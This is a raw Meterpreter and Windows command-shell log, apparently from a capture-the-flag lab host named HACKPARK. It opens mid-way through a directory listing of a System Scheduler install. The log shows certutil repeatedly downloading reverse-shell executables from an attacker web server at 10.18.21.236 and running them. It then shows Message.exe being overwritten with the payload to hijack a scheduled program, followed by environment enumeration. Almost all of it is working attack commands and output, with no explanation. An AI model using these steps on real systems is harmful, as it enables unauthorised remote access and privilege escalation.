100777/rwxrwxrwx  27040    fil   2018-03-25 19:58:58 +0200  PlayWAV.exe
100666/rw-rw-rw-  149      fil   2019-08-05 00:05:19 +0200  Preferences.ini
100777/rwxrwxrwx  485792   fil   2018-03-25 19:58:58 +0200  Privilege.exe
100666/rw-rw-rw-  10100    fil   2018-03-24 20:09:04 +0100  ReadMe.txt
100777/rwxrwxrwx  112544   fil   2018-03-25 19:58:58 +0200  RunNow.exe
100777/rwxrwxrwx  235936   fil   2018-03-25 19:58:56 +0200  SSAdmin.exe
100777/rwxrwxrwx  731552   fil   2018-03-25 19:58:56 +0200  SSCmd.exe
100777/rwxrwxrwx  456608   fil   2018-03-25 19:58:58 +0200  SSMail.exe
100777/rwxrwxrwx  1633696  fil   2018-03-25 19:58:52 +0200  Scheduler.exe
100777/rwxrwxrwx  491936   fil   2018-03-25 19:59:00 +0200  SendKeysHelper.exe
100777/rwxrwxrwx  437664   fil   2018-03-25 19:58:56 +0200  ShowXY.exe
100777/rwxrwxrwx  439712   fil   2018-03-25 19:58:56 +0200  ShutdownGUI.exe
100666/rw-rw-rw-  785042   fil   2006-05-17 01:49:52 +0200  WSCHEDULER.CHM
100666/rw-rw-rw-  703081   fil   2006-05-17 01:58:18 +0200  WSCHEDULER.HLP
100777/rwxrwxrwx  136096   fil   2018-03-25 19:58:58 +0200  WSCtrl.exe
100777/rwxrwxrwx  68512    fil   2018-03-25 19:58:54 +0200  WSLogon.exe
100666/rw-rw-rw-  33184    fil   2018-03-25 19:59:00 +0200  WSProc.dll
100666/rw-rw-rw-  2026     fil   2006-05-17 00:58:18 +0200  WScheduler.cnt
100777/rwxrwxrwx  331168   fil   2018-03-25 19:58:52 +0200  WScheduler.exe
100777/rwxrwxrwx  98720    fil   2018-03-25 19:58:54 +0200  WService.exe
100666/rw-rw-rw-  54       fil   2019-08-04 13:36:42 +0200  Website.url
100777/rwxrwxrwx  76704    fil   2018-03-25 19:58:58 +0200  WhoAmI.exe
100666/rw-rw-rw-  1150     fil   2007-05-17 22:47:02 +0200  alarmclock.ico
100666/rw-rw-rw-  766      fil   2003-08-31 21:06:08 +0200  clock.ico
100666/rw-rw-rw-  80856    fil   2003-08-31 21:06:10 +0200  ding.wav
100666/rw-rw-rw-  1637972  fil   2009-01-09 04:21:48 +0100  libeay32.dll
100777/rwxrwxrwx  40352    fil   2018-03-25 19:59:00 +0200  sc32.exe
100666/rw-rw-rw-  766      fil   2003-08-31 21:06:26 +0200  schedule.ico
100666/rw-rw-rw-  355446   fil   2009-01-09 04:12:34 +0100  ssleay32.dll
100666/rw-rw-rw-  6999     fil   2019-08-04 13:36:42 +0200  unins000.dat
100777/rwxrwxrwx  722597   fil   2019-08-04 13:36:32 +0200  unins000.exe
100666/rw-rw-rw-  6574     fil   2009-06-27 02:27:32 +0200  whiteclock.ico

meterpreter > shell
Process 1496 created.
Channel 1 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

c:\Program Files (x86)\SystemScheduler>certutil -urlcache -split -f "http://10.18.21.236:8000/shells/revsh-meterpr-444.exe" "C:\windows\temp\revsh-443.exe"
certutil -urlcache -split -f "http://10.18.21.236:8000/shells/revsh-meterpr-444.exe" "C:\windows\temp\revsh-443.exe"
****  Online  ****
  000000  ...
  01204a
CertUtil: -URLCache command completed successfully.

c:\Program Files (x86)\SystemScheduler>C:\windows\temp\revsh-443.exe
C:\windows\temp\revsh-443.exe

c:\Program Files (x86)\SystemScheduler>C:\windows\temp\revsh-443.exe
C:\windows\temp\revsh-443.exe

c:\Program Files (x86)\SystemScheduler>certutil -urlcache -split -f "http://10.18.21.236:8000/shells/revsh-443.exe" "C:\windows\temp\revsh-443.exe"
certutil -urlcache -split -f "http://10.18.21.236:8000/shells/revsh-443.exe" "C:\windows\temp\revsh-443.exe"
****  Online  ****
  000000  ...
  01204a
CertUtil: -URLCache command completed successfully.

c:\Program Files (x86)\SystemScheduler>C:\windows\temp\revsh-443.exe
C:\windows\temp\revsh-443.exe

c:\Program Files (x86)\SystemScheduler>certutil -urlcache -split -f "http://10.18.21.236:8000/shells/revsh-443.exe" "revsh-443.exe"
certutil -urlcache -split -f "http://10.18.21.236:8000/shells/revsh-443.exe" "revsh-443.exe"
****  Online  ****
  000000  ...
  01204a
CertUtil: -URLCache command completed successfully.

c:\Program Files (x86)\SystemScheduler>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 0E97-C552

 Directory of c:\Program Files (x86)\SystemScheduler

06/07/2024  12:04 PM    <DIR>          .
06/07/2024  12:04 PM    <DIR>          ..
05/17/2007  01:47 PM             1,150 alarmclock.ico
08/31/2003  12:06 PM               766 clock.ico
08/31/2003  12:06 PM            80,856 ding.wav
06/07/2024  12:03 PM    <DIR>          Events
08/04/2019  04:36 AM                60 Forum.url
01/08/2009  08:21 PM         1,637,972 libeay32.dll
11/16/2004  12:16 AM             9,813 License.txt
06/07/2024  11:21 AM             1,496 LogFile.txt
06/07/2024  11:22 AM             3,760 LogfileAdvanced.txt
03/25/2018  10:58 AM           536,992 Message.exe
03/25/2018  10:59 AM           445,344 PlaySound.exe
03/25/2018  10:58 AM            27,040 PlayWAV.exe
08/04/2019  03:05 PM               149 Preferences.ini
03/25/2018  10:58 AM           485,792 Privilege.exe
03/24/2018  12:09 PM            10,100 ReadMe.txt
06/07/2024  12:04 PM            73,802 revsh-443.exe
03/25/2018  10:58 AM           112,544 RunNow.exe
03/25/2018  10:59 AM            40,352 sc32.exe
08/31/2003  12:06 PM               766 schedule.ico
03/25/2018  10:58 AM         1,633,696 Scheduler.exe
03/25/2018  10:59 AM           491,936 SendKeysHelper.exe
03/25/2018  10:58 AM           437,664 ShowXY.exe
03/25/2018  10:58 AM           439,712 ShutdownGUI.exe
03/25/2018  10:58 AM           235,936 SSAdmin.exe
03/25/2018  10:58 AM           731,552 SSCmd.exe
01/08/2009  08:12 PM           355,446 ssleay32.dll
03/25/2018  10:58 AM           456,608 SSMail.exe
08/04/2019  04:36 AM             6,999 unins000.dat
08/04/2019  04:36 AM           722,597 unins000.exe
08/04/2019  04:36 AM                54 Website.url
06/26/2009  05:27 PM             6,574 whiteclock.ico
03/25/2018  10:58 AM            76,704 WhoAmI.exe
05/16/2006  04:49 PM           785,042 WSCHEDULER.CHM
05/16/2006  03:58 PM             2,026 WScheduler.cnt
03/25/2018  10:58 AM           331,168 WScheduler.exe
05/16/2006  04:58 PM           703,081 WSCHEDULER.HLP
03/25/2018  10:58 AM           136,096 WSCtrl.exe
03/25/2018  10:58 AM            98,720 WService.exe
03/25/2018  10:58 AM            68,512 WSLogon.exe
03/25/2018  10:59 AM            33,184 WSProc.dll
              39 File(s)     11,222,061 bytes
               3 Dir(s)  39,131,037,696 bytes free

c:\Program Files (x86)\SystemScheduler>certutil -urlcache -split -f "http://10.18.21.236:8000/shells/revsh-443.exe" "revsh-443                 
certutil -urlcache -split -f "http://10.18.21.236:8000/shells/revsh-443.exe
****  Online  ****
  000000  ...
  01204a
CertUtil: -URLCache command completed successfully.

c:\Program Files (x86)\SystemScheduler>certutil -urlcache -split -f "http://10.18.21.236:8000/shells/revsh-443.exe" "message.exe"
certutil -urlcache -split -f "http://10.18.21.236:8000/shells/revsh-443.exe" "message.exe"
****  Online  ****
  000000  ...
  01204a
CertUtil: -URLCache command completed successfully.

c:\Program Files (x86)\SystemScheduler>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 0E97-C552

 Directory of c:\Program Files (x86)\SystemScheduler

06/07/2024  12:04 PM    <DIR>          .
06/07/2024  12:04 PM    <DIR>          ..
05/17/2007  01:47 PM             1,150 alarmclock.ico
08/31/2003  12:06 PM               766 clock.ico
08/31/2003  12:06 PM            80,856 ding.wav
06/07/2024  12:05 PM    <DIR>          Events
08/04/2019  04:36 AM                60 Forum.url
01/08/2009  08:21 PM         1,637,972 libeay32.dll
11/16/2004  12:16 AM             9,813 License.txt
06/07/2024  11:21 AM             1,496 LogFile.txt
06/07/2024  11:22 AM             3,760 LogfileAdvanced.txt
06/07/2024  12:05 PM            73,802 Message.exe
03/25/2018  10:59 AM           445,344 PlaySound.exe
03/25/2018  10:58 AM            27,040 PlayWAV.exe
08/04/2019  03:05 PM               149 Preferences.ini
03/25/2018  10:58 AM           485,792 Privilege.exe
03/24/2018  12:09 PM            10,100 ReadMe.txt
06/07/2024  12:05 PM            73,802 revsh-443.exe
03/25/2018  10:58 AM           112,544 RunNow.exe
03/25/2018  10:59 AM            40,352 sc32.exe
08/31/2003  12:06 PM               766 schedule.ico
03/25/2018  10:58 AM         1,633,696 Scheduler.exe
03/25/2018  10:59 AM           491,936 SendKeysHelper.exe
03/25/2018  10:58 AM           437,664 ShowXY.exe
03/25/2018  10:58 AM           439,712 ShutdownGUI.exe
03/25/2018  10:58 AM           235,936 SSAdmin.exe
03/25/2018  10:58 AM           731,552 SSCmd.exe
01/08/2009  08:12 PM           355,446 ssleay32.dll
03/25/2018  10:58 AM           456,608 SSMail.exe
08/04/2019  04:36 AM             6,999 unins000.dat
08/04/2019  04:36 AM           722,597 unins000.exe
08/04/2019  04:36 AM                54 Website.url
06/26/2009  05:27 PM             6,574 whiteclock.ico
03/25/2018  10:58 AM            76,704 WhoAmI.exe
05/16/2006  04:49 PM           785,042 WSCHEDULER.CHM
05/16/2006  03:58 PM             2,026 WScheduler.cnt
03/25/2018  10:58 AM           331,168 WScheduler.exe
05/16/2006  04:58 PM           703,081 WSCHEDULER.HLP
03/25/2018  10:58 AM           136,096 WSCtrl.exe
03/25/2018  10:58 AM            98,720 WService.exe
03/25/2018  10:58 AM            68,512 WSLogon.exe
03/25/2018  10:59 AM            33,184 WSProc.dll
              39 File(s)     10,758,871 bytes
               3 Dir(s)  39,131,475,968 bytes free

c:\Program Files (x86)\SystemScheduler>sysinfo
sysinfo
'sysinfo' is not recognized as an internal or external command,
operable program or batch file.

c:\Program Files (x86)\SystemScheduler>ver
ver

Microsoft Windows [Version 6.3.9600]

c:\Program Files (x86)\SystemScheduler>set
set
ALLUSERSPROFILE=C:\ProgramData
CommonProgramFiles=C:\Program Files (x86)\Common Files
CommonProgramFiles(x86)=C:\Program Files (x86)\Common Files
CommonProgramW6432=C:\Program Files\Common Files
COMPUTERNAME=HACKPARK
ComSpec=C:\Windows\system32\cmd.exe
FP_NO_HOST_CHECK=NO
NUMBER_OF_PROCESSORS=2
OS=Windows_NT
Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\
PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
PROCESSOR_ARCHITECTURE=x86
PROCESSOR_ARCHITEW6432=AMD64
PROCESSOR_IDENTIFIER=Intel64 Family 6 Model 79 Stepping 1, GenuineIntel
PROCESSOR_LEVEL=6
PROCESSOR_REVISION=4f01
ProgramData=C:\ProgramData
ProgramFiles=C:\Program Files (x86)
ProgramFiles(x86)=C:\Program Files (x86)
ProgramW6432=C:\Program Files
PROMPT=$P$G
PSModulePath=C:\Windows\system32\WindowsPowerShell\v1.0\Modules\
PUBLIC=C:\Users\Public
SystemDrive=C:
SystemRoot=C:\Windows
TEMP=C:\Windows\TEMP
TMP=C:\Windows\TEMP
USERDOMAIN=IIS APPPOOL
USERNAME=Blog
USERPROFILE=C:\Users\Default
windir=C:\Windows

c:\Program Files (x86)\SystemScheduler>exit
exit

exit


```